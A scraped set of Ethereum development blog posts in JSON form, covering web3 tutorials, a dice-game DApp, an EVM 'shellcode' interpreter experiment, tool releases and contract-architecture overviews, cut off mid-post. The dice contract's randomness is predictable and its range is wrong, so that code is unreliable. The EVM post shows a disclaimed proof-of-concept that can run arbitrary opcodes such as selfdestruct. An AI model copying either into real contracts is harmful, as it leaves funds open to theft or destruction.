"https://blog.polymath.network/developing-with-polymath-using-web3-part-1-d24c5f5624f7?source=search_post", "post_date": "Oct 4, 2018", "readtime": "3 min read", "upvotes": "201", "content": "Developing with Polymath: Using web3 (Part\u00a01)Shannon ClarkeBlockedUnblockFollowFollowingOct 4, 2018In this two-part tutorial, we\u2019re going to connect to Polymath contracts (v1.3 on Kovan) using web3.js and create-react-app in order to register a Ticker symbol.Since registering a Ticker requires 250 POLY, let\u2019s start by showing you how to request POLY from the PolyToken contract. In the next tutorial (Part 2), we will cover the registration of a Ticker as well as viewing your previously registered Ticker symbols. If you only want to view the code, click here for the github repo.Note: Before you get started, please make sure that you have Metamask installed and unlocked on your preferred browser. You may also need to grab some Kovan TestNet ETH. You can follow instructions to get Kovan TestNet ETH here: https://faucet.kovan.networkGetting started with React and\u00a0web3We can quickly scaffold by executing the following commands where project-name is whatever you\u2019d like to name your project folder:npm i -g create-react-app create-react-app {project-name}cd {project-name}Now let\u2019s install web3 which is a \u201ccollection of libraries which allow you to interact with a local or remote Ethereum node, using a HTTP or IPC connection\u201d. Essentially, it provides a Javascript API for us to access the smart contract through a web interface. We\u2019ll be using web3 1.0.x for this tutorial.We\u2019ll also install reactstrap to assist with displaying and improving the user-interfacenpm i web3 --savenpm i bootstrap --savenpm i reactstrap --saveNote: In order to use bootstrap, you need to add the following import to yourindex.js file: `import 'bootstrap/dist/css/bootstrap.min.css';Edit your src/App.js to import web3 and within componentDidMount() you can access web3 as follows:Note: Make sure that you have Metamask installed and unlocked.Now if you executeyarn start from the command line then you will see your selected Metamask account\u2019s Eth Address. You can also clone the \u201cstep1\u201d branch of this repo.Connecting to Smart ContractsWe will connect to the TestNet (Kovan) deployment of the PolyToken contract which we can find by checking etherscan for its deployed address here: 0xB06d72a24df50D4E2cAC133B320c5E7DE3ef94cB. Go to the \u201cCode\u201d tab and copy the \u201cContract ABI\u201d. This interface is in a JSON-format and provides us with access to the smart contract\u2019s functions.Note: The PolyToken contract can be accessed via the TickerRegistry contract but we\u2019ll cover that in the next article.Now, within the src folder of your app, let\u2019s do the following:mkdir contracts && cd contractstouch PolyTokenFaucet.jsonEdit the PolyTokenFaucet.json to the following:{  \"contractName\": \"PolyTokenFaucet\",  \"abi\": /** Paste the full ABI here **/}Let\u2019s go back to src/App.js and import the PolyTokenFaucet contract as well as connect to it and check our POLY balance. Update src/App.js as follows:Now you have your POLY balance displayed within the app. You can confirm this balance by adding the PolyToken to your Metamask account under accounts. You can do so by clicking \u201cAdd Token\u201d under your Metamask account (in \u201cTokens\u201d section).If you don\u2019t have any POLY at the moment, let\u2019s call the getTokens() function from the PolyToken contract. The getTokens() function accepts two parameters:_amount (uint256)\u200a\u2014\u200athe amount of POLY to be sent_recipient (String)\u200a\u2014\u200athe ETH address which will receive the POLYUpdate your src/App.js to include a form so that you can set how much POLY you\u2019d like to grab.Run yarn start again and you should successfully be able to grab TestNet POLY after updating the request POLY field and confirming the Metamask transaction. In part 2 of this tutorial, we\u2019ll refactor this code to include the TickerRegistry smart contract so that we can register our own Ticker symbol!Are you looking for the full code? Check out this github repo!We are rewarding developers who build modules for the Polymath ecosystem with bounties! We look forward to seeing your PRs on Github and \u201cRequests to work\u201d on Gitcoin!Do you have questions about developing with Polymath? Please ask questions on our Gitter and use our Developer Portal as a reference.", "responses": ""}, {"title": "Building A Dice Game DApp On The Ethereum Blockchain", "author_name": "Gaurav Agrawal", "link": "https://medium.com/crowdbotics/building-a-dice-game-dapp-on-the-ethereum-blockchain-7c6ba17f30ba?source=search_post", "post_date": "Nov 19, 2018", "readtime": "8 min read", "upvotes": "58", "content": "Building A Dice Game DApp On The Ethereum BlockchainExploring interesting use cases for the Ethereum blockchain by building a simple dice roll DApp game with Truffle Framework.Gaurav AgrawalBlockedUnblockFollowFollowingNov 19, 2018\u2018DApp\u2019 is an abbreviation for Decentralized app. DApps are a new paradigm for building apps where a back end centralized server is replaced by a decentralized peer to peer network.Industry-wide, we\u2019re just beginning to scratch the surface of potential blockchain use cases. Most people associate \u2018blockchain\u2019 with \u2018cryptocurrencies,\u2019 but new use cases for blockchain technology are emerging everyday.Today, I\u2019ll show you how to build a simple dice game with Ethereum as a means to explore different and interesting uses cases for blockchain technology.What is an Ethereum\u00a0DApp?Ethereum DApps build on Ethereum blockchain technology, where Ethereum serves as the backend for the application.One of the most popular DApps, cryptokitties, is collectibles-style game built on Ethereum. When we build a game with Ethereum, essentially, each game action and transaction is stored on the Ethereum blockchain.Roll the Dice\u00a0DAppLet\u2019s create a simple dice roll game.\u2018Player\u2019 will roll the dice and chance to win 0.00001 ether. \u2018Target\u2019 will be set between 1 to 6.You can try our Roll the Dice here. Note: Game is deployed on Rinkeby network only.Now let\u2019s dive into the code.How To Play The\u00a0GameClick on \u201cGet new bet\u201d to get the target.Next, roll the Dice by clicking \u201cRoll it\u201d.If you get the same number, 0.00001 ether will be transfer to your account.PrerequisiteUnderstanding of NodejsBasic understanding of Smart contractTruffle frameworkUnderstanding of Html and JavascriptMetamask walletDice smart\u00a0contractOur Dice.sol smart contract will control the core logic for our game. Let\u2019s have a look at the code:struct Bet{  uint8  currentBet; // this is target  bool  isBetSet; //default value is false   uint8  destiny; //  }mapping(address => Bet) private bets;uint8 private randomFactor;We will define Bet structure as having 3 variables:currentBet\u00a0: This is used to set a new bet.isBetSet\u00a0: To check if the bet is set or not?destiny\u00a0: Contains the number when you roll the dice.We will also create mapping which will track the bets of players, and add a randomFactor, which will be used to randomize our results.Events: We have 2 events, one will emit when the bet is set for a player and other is for the game result. Events help in conveying state change on the frontend.event NewBetIsSet(address bidder , uint8 currentBet);event GameResult(address bidder, uint8 currentBet , uint8 destiny);Getting a new\u00a0betTo take a bet from a new player, we will perform the following steps:Check if a bet is already set for the playerMark the bet as set nowGet the random number and set the current betEmit \u2018 NewBetIsSet\u2019 event and return the current betfunction getNewbet() public returns(uint8){  require(bets[msg.sender].isBetSet == false);  bets[msg.sender].isBetSet = true;  bets[msg.sender].currentBet = random();  randomFactor += bets[msg.sender].currentBet;  emit NewBetIsSet(msg.sender, bets[msg.sender].currentBet);  return bets[msg.sender].currentBet; }Rolling the\u00a0DiceNext, we will roll the dice. For this, we will perform the following steps:Check if a bet is set for the playerGet the random number and set the destinyMark the isBetSet variable falseCheck if currentbet and destiny is equal, if yes transfer the prize(0.00001 ether) to the player and emit the GameResult event.Else only emit the GameResult event if currentBet and destiny is not equal.function roll() public returns(address , uint8 , uint8){  require(bets[msg.sender].isBetSet == true);  bets[msg.sender].destiny = random();  randomFactor += bets[msg.sender].destiny;  bets[msg.sender].isBetSet = false;  if(bets[msg.sender].destiny == bets[msg.sender].currentBet){   msg.sender.transfer(100000000000000);   emit GameResult(msg.sender, bets[msg.sender].currentBet, bets[msg.sender].destiny);     }else{   emit GameResult(msg.sender, bets[msg.sender].currentBet, bets[msg.sender].destiny);  }  return (msg.sender , bets[msg.sender].currentBet , bets[msg.sender].destiny); }We are adding destiny and currentBet to our randomFactor every time. This helps us randomize our bets efficiently.Other than above core functions, we have an isBetSet function to tell if the bet is set for a player and a random function to get random numbers for our dice.function isBetSet() public view returns(bool){  return bets[msg.sender].isBetSet; }function random() private view returns (uint8) { uint256 blockValue = uint256(blockhash(block.number-1 +    block.timestamp));        blockValue = blockValue + uint256(randomFactor);        return uint8(blockValue % 5) + 1; }Fallback Function: We will also add a fallback function. This function is executed if a contract is called and no other function matches the specified function identifier, or if no data is supplied. These functions are also executed whenever a contract would receive plain Ether, without any data.function() public payable{}Note: You should test your smart contract. You can learn more about testing smart contracts in some of our previous tutorials.Truffle frameworkWe will use Truffle framework to develop our DApp. Truffle has prebuilt packages which they call boxes. Truffle boxes help in getting the boilerplate code to develop a DApp. You can check more about truffle boxes here. We will use basic pet-box which will give us the boilerplate code for Dice game DApp. You can learn more about truffle pet-box here.Let\u2019s walk through app.js and understand what's happening on the frontend.We will define our app variable and declare variables we will use throughout app.js.We will also add an \u2018init\u2019 function in which will initialize web3 provider. Web3 provider allows your application to communicate with an Ethereum Node.MetaMask, an ethereum chrome extension wallet, will inject web3.js. Here, we will see if any web3 provider already exists. If not, it will try to connect a local blockchain. For testing purposes, we will run ganache on our local machine and connect to it.App = {  web3Provider: null,  contracts: {},  account: '0x0',  hasVoted: false,init: function() {    return App.initWeb3();  },initWeb3: function() {    if (typeof web3 !== 'undefined') {      // If a web3 instance is already provided by Meta Mask.      App.web3Provider = web3.currentProvider;      web3 = new Web3(web3.currentProvider);    } else {      App.web3Provider = new Web3.providers.HttpProvider('http://localhost:8545');      web3 = new Web3(App.web3Provider);    }    return App.initContract();  },Getting Dice\u00a0ContractTruffle petbox gives us truffle-contract.js which gives us the boilerplate code to interact with the contract. We use ABI (Application Programming Interface), a JSON representation of our contractl to interact with our contract on the frontend.If we don\u2019t use truffle we manually need to change this ABI every time when change and compile our contract. Whenever you compile a solidity smart contract, it will generate a JSON file. This JSON file is ABI to interact with the smart contract.initContract: function() {    $.getJSON(\"Dice.json\", function(dice) {      // Instantiate a new truffle contract from the artifact      App.contracts.Dice = TruffleContract(dice);      // Connect provider to interact with contract      App.contracts.Dice.setProvider(App.web3Provider);App.listenForEvents();return App.render();    });  },We now get the Dice.json file, which is JSON representation of our smart contract. We initiate our Dice contract and set the web3.provider. truffle-contract.js are helping us here by providing TruffleContract function. You can check Dice.json and truffle-contract.js for more details.Listening EventsEvents are a crucial part of any DApp.Asynchronous and blockchain transactions take time. Events help us in tracking the status inside the DApp.We will change our interface to show changes to users. We are listening to both events GameResult and NewBetIsSet and passing event object to render UI accordingly.listenForEvents: function() {    App.contracts.Dice.deployed().then(function(instance) {      instance.GameResult({}, {}).watch(function(error, event) {        console.log(\"event triggered\", event)        // Reload when a new vote is recorded        App.render(event);      });    instance.NewBetIsSet({}, {}).watch(function(error, event) {        console.log(\"event triggered\", event)        // Reload when a new vote is recorded        App.render(event);      });});  },Check render method. We are checking events and showing results to users accordingly and also we are calling isBetSet method to know if a bet is set for a user or not.render: function(event) {    var gameInstance;    // Load account data    web3.eth.getCoinbase(function(err, account) {      if (err === null) {        App.account = account;        $(\"#accountAddress\").html(\"Your Account : \" + account );      }    });if(event.event == \"NewBetIsSet\"){    $(\"#newBet\")      .text(\"Your target is : \" + event.args.currentBet.toNumber());    }if(event.event == \"GameResult\") {        var destiny = event.args.destiny.toNumber();      var currentBet = event.args.currentBet.toNumber();      var doWeHaveAWinner = (destiny == currentBet);      if(doWeHaveAWinner){          $(\"#result\").text(\"we have a winner\");      }else{          $(\"#result\").text(\"Sorry bad luck, your got \" + destiny);      }    }// Load contract data    App.contracts.Dice.deployed().then(function(instance) {      gameInstance = instance;      return gameInstance.isBetSet();    }).then(function(isBetSet) {      var message = $(\"#message\");      if(isBetSet){        message.text('Bet is Set, Roll the Dice')      }else{      message.text('Set New Bet');    }    }).catch(function(error) {      console.warn(error);    });  }Also, we are defining roll and getNewBet method which we are calling from index.html on button clicks.roll : function(){    App.contracts.Dice.deployed().then(function(instance) {      return instance.roll({ from: App.account });    }).then(function(result) {    }).catch(function(err) {      console.error(err);    });  },getNewBet: function() {    $(\"#result\").text(\"\");    App.contracts.Dice.deployed().then(function(instance) {      return instance.getNewbet({ from: App.account });    }).then(function(result) {       }).catch(function(err) {      console.error(err);    });  }Deploying our\u00a0DappWe will use ganache for deploying our DApp locally. If you don\u2019t have ganache, you can download it here. Run the commands below to deploy our contracts.truffle compiletruffle migrate --resetThis will deploy our smart contract to interact with the smart contract you can use truffle console command.Full codeYou can see full code for our dice game here.You can play around with the live DApp here.ImprovementThere are a lot of improvements which can be made to our Dice apart from UI.Here are a few suggested improvements which you add to your version of the Game.Optimize the memory. There is no need to story destiny, you can remove that.Optimize the amount of Gas we are using.Add a withdraw function to take out the extra ether from the contract.Make random function better. Generating random numbers on blockchains are itself a challenge as everything on blockchain is public.Improve the UI. Make it roll \ud83d\ude03ConclusionDApps are a new paradigm to for building applications on the internet, and we\u2019re just scratching the surface. Instead of hosting an app on Heroku, we can host our app on IPFS (decentralize peer to peer file system).DApps decentralize the way we interact on the internet. DApps run on decentralized networks, in our case Ethereum blockchain, but not every DApp needs to be built with a blockchain.In the future, you will see more Dapps with awesome UX and better use cases. Now\u2019s the time to explore!Building A Web Or Mobile\u00a0App?Crowdbotics is the fastest way to build, launch and scale an application.Developer? Try out the Crowdbotics App Builder to quickly scaffold and deploy apps with a variety of popular frameworks.Busy or non-technical? Join hundreds of happy teams building software with Crowdbotics PMs and expert developers. Scope timeline and cost with Crowdbotics Managed App Development for free.", "responses": ""}, {"title": "Smashing the EVM for Fun and\u2026Extensibility", "author_name": "Steven McKie", "link": "https://medium.com/blockchannel/smashing-the-evm-for-fun-and-extensibility-2fc7cbc4752f?source=search_post", "post_date": "Nov 14, 2017", "readtime": "4 min read", "upvotes": "84", "content": "Smashing the EVM for Fun and\u2026ExtensibilityNote: This is a crosspost that was submitted to BlockChannel with the author\u2019s permission; this post originally appeared\u00a0here.Steven McKieBlockedUnblockFollowFollowingNov 14, 2017I began this blog with the intent of speaking about the recent Parity Wallet event. After dissecting the code fully, and reading what else had been written by others, I felt there was little more to say. Short of brute forcing the address of the deleted code, we are not likely to see those funds recovered without a fork.Instead, I decided to write about the first thought I had while considering the Parity Wallet hack. As I was trying to think of possible solutions, I asked myself the question, \u201cWhat if I could make a contract that would allow me to run any code, any time, without the need for a library?\u201dMany contracts allow a user to interact with arbitrary code through the use of a proxy. This can be seen below:function () payable {someAddress.delegatecall(msg.data);}This function allows a user to call external code, but what I wanted was to simply call a contract and execute the code I passed in as an argument. Essentially, shellcode for the EVM.This is obviously NOT a good idea in most places. DAOs, token contracts, or any shared state contract would have no security with this code written into place. That said, it was fun to build.Disclaimer: This code was thrown together over a few hours, and is in no way optimized or even fully tested. This is a simple proof of concept. Do not use or deploy this code into any contract, for any\u00a0reason.The first step to building EVM shellcode was to build a model. I settled on creating a stack machine inside of memory, using Solidity Assembly. Once I had a model, I had to build a loader. The loader I built can be seen on lines 5, 6, and 7.These lines of code set up an instruction pointer, an argument pointer, and finally the stack pointer. This setup assumes the first bytes32 object from the passed in array is a number specifying the total number of arguments. Thus, the arguments may be found isolated from the instructions. The instructions are loaded in code starting with index 1, and are read one bytes32 at a time. Granted this is a huge waste, since each opcode is only 2 bytes, but it was easier.1.  contract meta{2.    function run(bytes32[] code){3.      require(msg.sender == owner);4.      assembly{5.        mstore(add(calldatasize,60),160)6.         mstore(add(calldatasize,92),7.         add(sub(sub(calldatasize,4),8.         mul(byte(0,mload(128)),32)),64))9.        mstore(add(calldatasize,124), add(calldatasize,1148))10.       loop:11.         switch byte(0,mload(mload(add(calldatasize,60))))12.           case 0x00{13.             stop14.           }15.           case 0x01{16.             mstore(add(mload(add(calldatasize,124)),32),17.              add(mload(mload(add(calldatasize,124))),18               mload(add(mload(add(calldatasize,124)),32))))19.             mstore(add(calldatasize,124),20.              add(mload(add(calldatasize,124)), 32) )21.           }Once a loader was built, and the stack machine created, I needed a way to get instructions to be executed based on the code I was passing in. The easiest way to facilitate this was to build a big ugly switch case inside of a loop. The switch case parses the next instruction by resolving the opcode from the instruction pointer. It then seeks out the case and executes the opcode specified, using the memory based stack machine.Each case represents the actual EVM opcode values and emulates the operation out of the memory based stack machine. This can be seen on line 16, 17, and 18 where an addition is performed from the memory based stack. Lines 19 and 20 then increment the stack pointer.This seems like a nice trick, but it is very cumbersome unless you can get in some variables. To solve this problem, I built a push instruction to put arguments on the memory based stack. This can be seen below under case 0x60:case 0x60{ //load argument 0    mstore(sub(mload(add(calldatasize,124)),32),    mload(mload(add(calldatasize,92))))   mstore(add(calldatasize,124),    sub(mload(add(calldatasize,124)), 32) )  }...mstore(add(calldatasize,60),add(mload(add(calldatasize,60)),32)) jump(loop)}Finally, I needed a way to increment the instruction pointer, and jump back up the loop to read the next instruction. This last snippet of code performs this task quite nicely.After running a few tests, I proved to myself that an arbitrary user could call any opcode he/she desired, using this code. Some of the instructions do not make sense when using a memory based stack, but others translate just fine. For instance, selfdestruct could be called using this method.Just in case you missed the point, using this code you could call selfdestruct on a contract that did not explicitly define a selfdestruct method. This may have been handy in a recent wallet hack. Then again, this code would probably be an even bigger security flaw than an unlocked instantiater.The most exciting application of this hack, in my opinion, is the ability to load bytecode from storage. It may be possible to build a framework that allows for extensible code by modification of storage.In the coming weeks, I will follow up with more code from this experiment and more details about the methods used. For now, I just wanted to get a few minds thinking about the possibilities of using memory, calldata, and storage to execute arbitrary bytecode. These methods may make for a system that allows code to be dynamically updated and recovered from malicious acts. This code may also cause terrible damage if used improperly.", "responses": ""}, {"title": "Waffle 2.0\u00a0released", "author_name": "Marek Kirejczyk", "link": "https://medium.com/ethworks/waffle-2-0-released-93b9db6e67ea?source=search_post", "post_date": "Jan 23", "readtime": "2 min read", "upvotes": "428", "content": "Waffle 2.0\u00a0releasedMarek KirejczykBlockedUnblockFollowFollowingJan 23After weeks of hard work, I am glad to announce the release of Waffle version 2.0, with a dozen new functionalities.What\u2019s new?Documentation and websiteWaffle now has detailed documentation and a new website.Faster compilation with native and dockerized solcBy default, Waffle uses solcjs as it\u2019s solidity compiler. This is convenient, because solcjs can be easily installed with the same tools as Waffle. On the other hand it tends to be slow for bigger projects.With Waffle 2.0 you can now use blazing quick native and dockerized solc. If you don\u2019t mind a couple of additional setup steps. Stay tuned for some Benchmarks.A screen from a new\u00a0websiteNew chai matchers: changeBalance The new changeBalance and changeBalances matchers allow checking if a balance of an account(s) changed, example below:Read more about new matchers in the documentation.Support for TypeScriptThe code is now rewritten in TypeScript with near complete support for developing with TypeScript. Notable exceptions are the chai matchers, which we plan to include in version 2.1.FixturesWhen extensively testing code dependent on smart contracts it is often useful to have a specific scenario play out before each test. That leads to repetition and slow code execution. With fixtures, you can clean-up your code and speed it up by a order of magnitude. Here comes an example fixtures declaration:And here how to use it:Read more about fixtures in the documentation.Others:Waffle now supports config files with both json and js extensions.Contract linking should work for both solidity 4 and solidity 5The compilation is covered with extensive end-to-end testsWaffle is now officially released under MIT licenseBreaking changes:getWallet() function is not async anymoreNode versions older than 10 are not longer supportedA new format for compilation output files has been introducedAcknowledgments:Waffle 2.0 was possible thanks to a group of wonderful contributors, in particular, I would like to thank:sz-piotr for implementing fixtures and migrating to TypeScriptvanruch for implementing change balance checkers (and revertedWith in previous version)rzadp for implementing linking of smart contractsspherefoundry and JustynaBroniszewska for their helpAnd last, but not least special thanks go to snario for day to day testing, reporting and helping in fixing multiple issues along the way.Get updatesIf you would like to get updates on Waffle \u2b50\ufe0f and follow us Waffle GitHub.EthworksIf would like to get updates on what we do\u200a\u2014\u200afollow us on Medium and if you like the story \ud83d\udc4f \ud83d\udc4f \ud83d\udc4f.", "responses": ""}, {"title": "Declarative Smart Contracts", "author_name": "James Prestwich", "link": "https://medium.com/summa-technology/declarative-smart-contracts-4edaf7ec2e30?source=search_post", "post_date": "Aug 31, 2018", "readtime": "6 min read", "upvotes": "186", "content": "Declarative Smart ContractsJames PrestwichBlockedUnblockFollowFollowingAug 31, 2018At Summa we work with cryptoassets on dozens of chains. Each chain is different. Models for states and consensus mechanisms vary widely through the ecosystem. But they all seem to share a purpose: allowing users to participate in consensus.Permissioned Shared\u00a0StateA blockchain brings nodes to consensus on a shared state (more or less). Each block contains a list of state change instructions (\u201ctransactions\u201d), which all nodes validate. Blocks establish a canonical order of transactions; proof of work establishes a canonical order of blocks. Each node validates each block and plays each state change to reach a local view of the current state. As long as nodes are using the same validation rules, these disparate views converge over time into a shared state. Honest nodes will agree on all but the most recent state.Transactions are created by humans or machines. Which is to say, every state change originates off-chain for some unknown purpose. The consensus rules don\u2019t care why a transaction was made, or how, only that it doesn\u2019t break the rules. There are many rules for transaction verification in any deployed blockchain: Is it formatted correctly? Is it trying to create money? But the most important one is simple: Is the user allowed to update this state?In Bitcoin, we check that the scriptSig satisfies the UTXO\u2019s scriptPubKey. Providing a valid scriptSig proves that we are allowed to consume that UTXO. In Ethereum we check that the transaction signature is valid, and that the account\u2019s balance is sufficient, and leave all other checks to the specific contracts involved. Until ECDSA is broken, these things can\u2019t be forged.Essentially, Bitcoin addresses, Bitcoin scripts, Ethereum accounts, Ethereum contracts, and all the related plumbing form permissions systems. They define conditions that restrict state changes. A state change that meets those The blockchain then enforces these permissions. You can\u2019t move Bitcoin or Ether or write contract state unless you\u2019re allowed to. And when you do, you specify new permissions. A Bitcoin transaction doesn\u2019t move coins. It updates their permissions. An Ethereum transaction doesn\u2019t transfer tokens, it writes new state for the token contract.This is the only goal of a blockchain. These networks exist to create consensus around a permissioned shared state. They build the UTXO set, or state tree, and control updates.Smart Contracts Dilute PermissionsMost Bitcoin and Ethereum transactions are completely explicit. They specify the exact state changes to be made, and prove that the signer has permission to update that state. When you send Bitcoin, you make a transaction describing exactly which coins to move and where to send them. Then you must prove that you are the owner of those coins. Because your directions are perfectly explicit, you know what will happen. You have given your permission for a specific, precisely defined change of state. Either that exact state change will occur, or no update will be made.Smart contracts, however, complicate things. The outcome of a call to a smart contract may depend on many things. It can depend on the internal state of the contract, or the states of other contracts. It can depend on the time of day, or the whim of a miner, or other transactions the signer hasn\u2019t seen.As such, smart contracts prevent us from knowing the outcome of a transaction before it is confirmed. Its state changes are unknown before the transaction is included in a block. By signing the transaction, the user has consented to whatever state changes the contract defines, without knowledge of the outcome. When users call a contract they entrust their funds to it with no guarantee of good behavior.Given that the entire point of a blockchain is to create and update a state securely, smart contracts are intuitively problematic. Users deserve to know exactly what the transaction will do before they sign it. Anything else cedes partial control of user funds to miners or other users. It dilutes the permissions set on the shared state, which diminishes the usefulness of the chain.Declarative Smart ContractsThe core issue is that smart contracts describe the state changes that happen, based on the current state. Instead contracts should describe the state changes that are allowed, based on the current state. Users would then submit proposed state updates, which would be validated by the contract. If the state updates are approved, the exact state update the user wants would be made. This is a declarative smart contract. It declares what allowed state changes, and leaves all control logic and implementation to the users.Writing contracts this way is somewhat non-intuitive. Developers are used to imperative programming. We give instructions to the computer, and it follows them. It feels strange to do anything else. However, this doesn\u2019t reflect the reality of a blockchain. The chain is not adding anything. It doesn\u2019t perform operations. Transactions don\u2019t contain or trigger a calculation. The chain is only a permissioned state. Transactions signed by users modify the state.Declarative contracts align the structure of the contract implementation with the reality of the chain by defining exactly what state modifications are permissible, and letting the user modify state directly. Declarative contracts prevent unintended state changes. They protect the user from miner interference. The final effect of a transaction can be clearly communicated to the user before signing. And transactions that violate the user\u2019s intent are simply not valid.Ideally, we should create a new declarative language to write these contracts. This language would define constraints that state updates must meet. Constraints on who can make changes, what the changes may be, and under what circumstances the changes may be made. I imagine this language would look something like Ivy.Writing A Declarative ContractIdeal world aside, we can write declarative contracts in Solidity today. In fact, Solidity has been adding features that make it more declarative. And the best practices for Solidity (like Checks-Effects-Interactions) are declarative. The community already recognizes this need, even if they haven\u2019t named it yet.To write declarative contracts in Solidity, we move the logic of the contract into a set of require function calls. These statements have access to the current state of the contract. Then, instead of providing arguments to a function, the user calls the function with the end state they want. The new state is verified by the require calls. They compare it to the current state, and check that any changes made are allowed. If all requirements are satisfied, the new state is written over the old state.Below is a simple declarative game. Users adjust a byte towards a goal, using a few approved moves. The state consists of two bytes. The first byte is the current position, and the second byte is the goal. The constructor sets both the starting position, and the goal. Users call update to make a move. If the move is valid, the new state is written. If the move is a valid winning move, the caller is paid.pragma solidity ^0.4.22;contract DeclarativeGame {bytes2 state;modifier notHalted() {        require(state[0] != state[1]);        _;    }modifier approvedStateChange(bytes2 _newState) {        require(_newState[1] == state[1]);        require(            _newState[0] == ~(state[0] & 0xAA)   ||            _newState[0] == state[0] ^ 0x01      ||            _newState[0] == state[0] & ~state[1]);        _;    }function DeclarativeGame(bytes2 _startState)        public        payable    {        state = _startState;    }function update(bytes2 _newState)        public        notHalted        approvedStateChange(_newState)    {        state = _newState;        if (state[0] == state[1]) {            msg.sender.transfer(this.balance);        }    }}You can also build more complex things like\u00a0tokens:pragma solidity ^0.4.22;contract DeclarativeToken {mapping(address => uint256) balances;modifier sameLength(address[] _addresses, uint256[] _balances) {        require(_addresses.length == _balances.length);        _;    }modifier approvedStateChange(address[] _addresses, uint256[] _balances) {        uint256 _endTotal = 0;        uint256 _startTotal = 0;// Check the sending address        require(_balances[0] < balances[_addresses[0]]);        require(_addresses[0] == msg.sender);        _startTotal += balances[_addresses[0]];        _endTotal += _balances[0];// Check each receiving address        for (uint i = 1; i < _addresses.length; i++) {            require(_balances[i] > balances[_addresses[i]]);            require(_addresses[i] != msg.sender);            _startTotal += balances[_addresses[i]];            _endTotal += _balances[i];        }// Check that we didn't create or destroy tokens        require(_endTotal == _startTotal);        _;    }function DeclarativeToken(address[] _addresses, uint256[] _balances)        sameLength(_addresses, _balances)    {        for (uint i = 0; i < _addresses.length; i++) {            balances[_addresses[i]] = _balances[i];        }    }function balanceOf(address _tokenOwner)        public        constant        returns (uint256)    {        return balances[_tokenOwner];    }function transfer(address[] _addresses, uint256[] _balances)        public        sameLength(_addresses, _balances)        approvedStateChange(_addresses, _balances)    {        for (uint i = 0; i < _addresses.length; i++) {            balances[_addresses[i]] = _balances[i];        }    }}", "responses": ""}, {"title": "Community Update\u200a\u2014\u200aJune 8,\u00a02018", "author_name": "BlockCAT", "link": "https://medium.com/blockcat/community-update-june-8-2018-d0203c614b1a?source=search_post", "post_date": "Jun 8, 2018", "readtime": "3 min read", "upvotes": "211", "content": "Community Update\u200a\u2014\u200aJune 8,\u00a02018Expanding the feature set of Tabby Pay.\u00a0\ud83d\udcbbBlockCATBlockedUnblockFollowFollowingJun 8, 2018In case you missed it, last week we announced our next smart contract, Tabby Rewards, which was met with a fair bit of enthusiasm from our community.While we\u2019re excited about this next dApp, we\u2019re equally as excited about the continued attention that our first smart contract, Tabby Pay, has been getting.After we attended Consensus 2018, we alluded to a few potential partnership possibilities after meeting with the various teams in attendance. One partnership in particular we\u2019re working on requires us to add some additional features to Tabby Pay before we can integrate our services.Therefore, we\u2019re going to be assigning some of our resources back towards Tabby Pay in order to add the functionality we need to be successful.", "responses": "1"}, {"title": "ChronoBank Smart Contracts", "author_name": "ChronoBank.io", "link": "https://blog.chronobank.io/chronobank-smart-contracts-54c305b2ae62?source=search_post", "post_date": "Dec 18, 2017", "readtime": "6 min read", "upvotes": "236", "content": "ChronoBank Smart ContractsChronoBank Smart Contracts ecosystem is built around two things simple for understanding: platforms and assets. Platforms act as a base for all token operations like issuing, balance storage, transfer. Assets add interface layout and define some custom internal logic to allow implementing different behavior, for example, adding a fee to token transactions.ChronoBank.ioBlockedUnblockFollowFollowingDec 18, 2017Since assets define just internal behavior, there are so-called ChronoBank asset proxies which provide an ERC20 standard interface (described in ERC20Interface.sol) and acts as a transaction proxy. It allows to add/change token logic by updating asset implementation and to recover a wallet access in case of key loss.While looking into details it could be spotted that our Smart Contracts ecosystem is more than just platforms and assets. These core entities represent important but small part of all functionality.EcosystemThe next foundational block in the ecosystem is a top-level contracts module (a handful of managers) that provides all needed interfaces to organize flexible and powerful tools.PDF version for detailed\u00a0previewContractsManager plays a role in the central registry which holds references to all services registered in a system.To get to the central registry contracts should be added by a contract owner of ContractsManager or those contacts that are allowed to do so (based on ACL in StorageManger).It\u2019s worth mentioning that a set of managers (top-level and others) do not store their data directly in storage, but use instead Storage contract to pass responsibility for saving data. This Storage contracts besides StorageManager are included in Shared Storage set of contracts.UserManager contract role is to provide system-wide user registry where simple users and admins (CBE) live together. It also provides a part of multisignature infrastructure by keeping a number of admins required to confirm operations.PendingManager contract provides the rest of multisignature functionality by holding and tracking operations performed in a system and carrying them out when a critical number of confirmations were received.ERC20Manager contract keeps track of all ERC20-based tokens registered in a system.Events History is a submodule which performs like a gate for all events happening in a system. All system managers are using the same instance of EventsHistory (see MultiEventsHistory contract), other contracts created during the system\u2019s work could use different event histories instances.Labour-Offering Companies (LOCManager) is a particular module that organizes work of ChronoBank with third-party companies and allows them to participate in the ChronoBank ecosystem.The next part of modules is designed to make users\u2019 life easier by providing additional layers of abstraction on top of existing core contracts.Key contractsPlatformsManagerPlatformsManager makes it possible to manipulate multiple platforms and create brand new platforms.AssetsManagerAssetsManager allows users to build their own tokens, organize their crowdsale.WalletManagerWalletManager gives the ability to create wallets for storing tokens and organize multisignature access to its balance and transfers. Note: multisignature mechanism is independently implemented and isn\u2019t based on PendingManager contract.OtherBesides aforementioned modules there are also modules that manipulate tokens (TIME and other ERC20 tokens) that allows to:unlock system\u2019s functionality for usage where it is needed to stake some amount of tokens to perform an operation;pay for unique functionality available in a system (such as creating a new platform, issuing a token, starting a token crowdsale, creating a wallet and some others).For providing such ability for a system, there were introduced a couple of contracts that are coupled with Deposit and Feature Fee modules.The last but not the least is Additionals modules that provided extended functionalities for ChronoBank ecosystem:Crowdsale\u200a\u2014\u200athe key contract is CrowdsaleManager and it organizes token crowdsale. It was made available to use only through AssetsManager.Voting\u200a\u2014\u200athe key contract is VotingManager which arranges poll creation where users that hold their TIME tokens in TimeHolder could vote to participate in system\u2019s decisions.Exchange\u200a\u2014\u200athe key contract is ExchangeManager which coordinates exchanges between different tokens and allows users to sell/buy tokens for other tokens.A more detailed version of the scheme contains internal entities and connections that participate in module\u2019s work.Dive in!ChronoBank ecosystem has its own token called TIME that fuels work of many functions. We gather them in one place to provide a more specific overview of their responsibilities.PDF version for detailed\u00a0previewTimeHolderMain contracts:timeholder/TimeHolder.solDeposit holder. Allows to deposit/withdraw TIME tokens. Users, who have deposits, are allowed to use some key features of the system such as creating ERC20 tokens, starting crowdsale for it, create exchanges and so forth.Users could deposit and withdraw at any time and those changes will appropriately update functionalities that are bound to TimeHolder (such as voting and so forth).Dev notes:New functionalities and new contracts could take advantage of using TimeHolder\u2019s shares to secure and restrict their features: developers are able to add new contracts and use ListenerInterface to observe changes in 